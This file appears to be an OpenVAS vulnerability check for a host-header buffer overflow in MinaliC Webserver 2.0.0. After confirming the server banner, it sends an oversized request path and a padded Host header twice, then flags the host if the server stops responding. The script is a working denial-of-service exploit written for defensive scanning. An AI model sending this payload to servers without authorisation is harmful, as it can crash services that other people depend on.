###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_minalic_web_server_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# MinaliC Host Header Handling Remote Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote unauthenticated attackers
  to cause a buffer overflow, resulting in a denial of service or potentially
  allowing the execution of arbitrary code.
  Impact Level: System/Application";

tag_affected = "MinaliC Webserver version 2.0.0";
tag_insight = "The issue is due to user-supplied input is not properly validated when
  handling a specially crafted host header in the request.";
tag_solution = "No solution or patch is available as of 16th April, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/minalic";
tag_summary = "This host is running MinaliC Webserver and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(803192);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-16 13:14:39 +0530 (Tue, 16 Apr 2013)");
  script_name("MinaliC Host Header Handling Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/92329");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24958/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121296/");
  script_summary("Check MinaliC Webserver is vulnerable by sending crafted pacakets");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);

if(!port){
  port = 8080;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: MinaliC" >!< banner){
  exit(0);
}

## Cross Confirm the application
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: MinaliC" >!< res) {
  exit(0);
}

## build the exploit
junk = crap(data:"0x41", length:245) + "[.|";
host = crap(data:"0x90", length:61);

req = string("GET ", junk , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");

## Send crafted data to server
res = http_keepalive_send_recv(port:port, data:req);
res = http_keepalive_send_recv(port:port, data:req);

## Check still server is alive or not, If not then
## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: MinaliC" >!< res) {
  security_hole(port);
}
